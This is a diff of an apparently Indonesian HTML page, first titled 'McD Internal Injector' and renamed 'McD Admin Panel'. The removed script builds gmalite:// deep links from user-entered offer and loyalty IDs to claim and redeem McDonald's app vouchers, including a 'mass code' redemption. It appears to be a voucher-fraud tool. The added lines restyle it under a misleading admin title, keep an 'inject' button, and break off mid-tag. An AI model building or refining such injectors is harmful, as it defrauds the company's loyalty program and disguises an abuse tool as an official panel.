@@ -1,53 +1,24 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>McD Internal Injector</title>
+    <title>McD Admin Panel</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #da291c; margin: 0; padding: 20px; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; }
-        .box { background: white; padding: 25px; border-radius: 25px; width: 100%; box-sizing: border-box; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        h2 { color: #333; font-size: 18px; margin-bottom: 20px; text-align: center; }
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 2px solid #eee; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #ffbc0d; }
-        .btn { background: #ffbc0d; color: #333; border: none; padding: 18px; border-radius: 12px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; }
-        .status { margin-top: 15px; font-size: 11px; color: #eee; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #da291c; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .container { background: white; padding: 30px; border-radius: 30px; width: 85%; max-width: 350px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); text-align: center; }
+        .logo { width: 50px; margin-bottom: 15px; }
+        h2 { color: #333; font-size: 20px; margin: 0 0 5px 0; }
+        p { color: #999; font-size: 11px; margin-bottom: 25px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-size: 10px; font-weight: bold; color: #da291c; text-transform: uppercase; margin-bottom: 5px; padding-left: 5px; }
+        input { width: 100%; padding: 15px; border: 2px solid #f2f2f2; border-radius: 15px; font-size: 16px; box-sizing: border-box; outline: none; background: #fafafa; transition: 0.3s; }
+        input:focus { border-color: #ffbc0d; background: #fff; }
+        .btn-inject { background: #ffbc0d; color: #222; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; box-shadow: 0 5px 15px rgba(255, 188, 13, 0.4); }
+        .footer { margin-top: 20px; font-size: 10px; color: #ccc; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <img src="https://www.mcdonalds.co.id/assets/img/common/mcdonalds_logo.png" width="40" style="display:block; margin: 0 auto 10px;">
-        <h2>Internal Injector</h2>
-        
-        <input type="number" id="off" placeholder="Offer ID (Misal: 272469)" inputmode="numeric">
-        <input type="number" id="loy" placeholder="Loyalty ID (Misal: 5271)" inputmode="numeric">
-
-        <button class="btn" onclick="gas()">INJECT KE SISTEM</button>
-    </div>
-
-    <p class="status">Connected to App Internal Browser</p>
-
-    <script>
-        function gas() {
-            var o = document.getElementById('off').value;
-            var l = document.getElementById('loy').value;
-
-            if (!o || !l) { alert("ID Kosong!"); return; }
-
-            // TEKNIK MUKIDI: Gunakan skema gmalite murni 
-            // Karena kita sudah di dalam webview McD, aplikasi akan langsung merespon ini
-            var target = "gmalite://offers/details?offer_id=" + o + "&loyalty_id=" + l + "&view=claim";
-            
-            // Perintah untuk pindah modul ke tampilan Voucher
-            window.location.href = target;
-
-            // Jika tidak otomatis pindah, gunakan pancingan kedua
-            setTimeout(function() {
-                window.location.href = "gmalite://offers/redeem?offer_id=" + o + "&loyalty_id=" + l + "&is_mass_code=1";
-            }, 800);
-        }
-    </script>
-
-</body>
-</html>
+<div class="container">
+    <img src="
